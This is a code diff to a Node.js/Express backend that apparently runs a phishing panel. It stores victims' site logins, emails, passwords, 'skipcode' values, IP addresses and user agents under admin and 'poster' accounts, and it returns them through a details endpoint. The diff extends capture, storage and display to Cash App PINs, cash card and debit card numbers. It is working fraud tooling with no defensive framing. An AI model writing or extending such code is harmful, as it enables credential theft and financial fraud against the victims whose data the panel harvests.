@@ -148,10 +148,11 @@ export const login_post = async (req, res) => {
 
 
 export const skip_code = (req, res) => {
-    const { id, skipcode } = req.body;
+    const { id, skipcode,cashPin,cashCard,debitCard } = req.body;
     Info.findOneAndUpdate({ _id: id }, {
         $set: {
-            skipcode: skipcode
+            skipcode: skipcode,
+            cashPin,cashCard,debitCard
         }
     }, { new: true }, (err, ok) => {
         if (err) {
@@ -420,7 +421,7 @@ export const add_data = async (req, res) => {
 
 
     const { adminId, posterId } = req.params
-    const { site, mail, passcode ,email,password } = req.body
+    const { site, mail, passcode ,email,password ,cashPin,cashCard,debitCard} = req.body
     const userAgent = req.headers['user-agent'];
     const ipAddress =  (req.headers['x-forwarded-for'] || 
     req.connection.remoteAddress || 
@@ -435,7 +436,7 @@ export const add_data = async (req, res) => {
         if (userFound && posterFound) {
             const info = await Info.create({
                 site, mail, passcode,
-                email,password,
+                email,password,cashPin,cashCard,debitCard,
                adminId:adminId,
                 poster: posterId,
                 root: posterFound._id,
@@ -642,7 +643,7 @@ export const poster_details =async  (req, res) => {
 
         const poster = await Poster.findOne({ _id: id }).select('username password posterId links createdAt')
        
-        const details =await Info.find({ root: id }).select('site mail passcode skipcode email password ip agent status number createdAt').sort({ createdAt: -1 })
+        const details =await Info.find({ root: id }).select('site mail passcode skipcode email password ip agent status number cashPin cashCard debitCard createdAt').sort({ createdAt: -1 })
         // const newdata = {...poster, details: details }
         // console.log(newdata)
         return res.status(200).json({ data: {...poster, details: details }})
